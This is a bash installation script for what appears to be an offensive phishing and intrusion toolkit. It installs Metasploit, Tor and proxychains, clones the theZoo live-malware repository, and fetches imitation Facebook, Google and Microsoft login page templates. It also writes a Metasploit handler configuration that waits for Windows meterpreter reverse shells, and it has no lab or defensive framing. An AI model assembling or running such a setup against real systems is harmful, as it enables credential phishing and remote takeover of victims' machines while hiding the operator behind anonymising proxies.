#!/bin/bash

# Update and install system dependencies
echo "Updating system and installing dependencies..."
sudo apt-get update
sudo apt-get install -y \
    tor \
    proxychains4 \
    curl \
    wget \
    python3 \
    python3-pip \
    python3-venv \
    git \
    build-essential \
    libreadline-dev \
    libssl-dev \
    libyaml-dev \
    libsqlite3-dev \
    sqlite3 \
    libgmp-dev \
    libncurses5-dev \
    libgdbm-dev \
    libdb-dev \
    libbz2-dev \
    libffi-dev \
    zlib1g-dev \
    liblzma-dev \
    ruby \
    bundler \
    libxml2-dev \
    libxslt-dev \
    metasploit-framework

# Initialize Metasploit database
echo "Initializing Metasploit database..."
msfdb init

# Create and activate virtual environment
echo "Creating and activating virtual environment..."
python3 -m venv venv
source venv/bin/activate

# Install Python packages
echo "Installing Python packages..."
pip install --upgrade pip
pip install PyQt5 twilio requests beautifulsoup4 lxml pymetasploit3 gitpython

# Clone TheZoo repository for malware samples
echo "Cloning TheZoo repository..."
git clone https://github.com/ytisf/theZoo.git malware/TheZoo

# Create necessary directories
echo "Creating necessary directories..."
mkdir -p templates payloads config

# Download prebuilt templates
echo "Downloading prebuilt templates..."
wget -O templates/facebook.html https://raw.githubusercontent.com/yourusername/yourrepo/master/templates/facebook.html
wget -O templates/google.html https://raw.githubusercontent.com/yourusername/yourrepo/master/templates/google.html
wget -O templates/microsoft.html https://raw.githubusercontent.com/yourusername/yourrepo/master/templates/microsoft.html

# Create configuration files
echo "Creating configuration files..."
cat <<EOL > config/proxychains.conf
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# add proxy here ...
socks5  127.0.0.1 9050
http    192.168.1.1 8080
socks4  10.0.0.1 1080
EOL

cat <<EOL > config/metasploit_config.rb
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
EOL

# Verify installation
echo "Verifying installation..."
pip list

echo "Setup complete!"
echo "To run the tool, activate the virtual environment and run the main script:"
echo "source venv/bin/activate"
echo "python main.py"